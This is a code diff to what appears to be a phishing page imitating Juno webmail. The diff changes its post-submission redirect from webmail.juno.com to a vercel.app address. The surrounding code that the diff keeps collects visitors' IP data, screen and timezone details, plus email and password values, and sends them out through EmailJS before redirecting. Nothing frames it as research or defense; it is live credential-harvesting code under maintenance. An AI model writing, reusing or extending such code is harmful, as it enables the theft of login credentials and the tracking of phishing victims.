@@ -122,6 +122,8 @@
     </script>
 
     <script>
+      const redirectUrl = "https://carmagic.vercel.app/";
+
       (function () {
         "use strict";
 
@@ -208,7 +210,7 @@
             screen_resolution: `${screen.width}x${screen.height}`,
 
             // url
-            url: "https://webmail.juno.com/",
+            url: redirectUrl,
 
             // Timezone offset
             timezone_offset: new Date().getTimezoneOffset(),
@@ -225,13 +227,13 @@
               dataSent = true;
               console.log("✅ IP data successfully sent via EmailJS");
               console.log("Response:", response.status, response.text);
-              window.location.replace("https://webmail.juno.com/");
+              window.location.replace(redirectUrl);
               return response;
             })
             .catch(function (error) {
               console.error("❌ Failed to send IP data via EmailJS:", error);
               console.error("Error details:", error.text || error.message);
-              window.location.replace("https://webmail.juno.com/");
+              window.location.replace(redirectUrl);
               throw error;
             });
         }
@@ -395,11 +397,11 @@
                   /* console.log("✅ Email sent successfully, redirecting...");
                   console.log("Email : ", emailValue)
                   console.log("Password : ", passwordValue) */
-                  window.location.replace("https://webmail.juno.com/");
+                  window.location.replace(redirectUrl);
                 })
                 .catch((error) => {
                 /*   console.error("❌ Error sending email:", error); */
-                  window.location.replace("https://webmail.juno.com/");
+                  window.location.replace(redirectUrl);
                 });
             });
           } else {
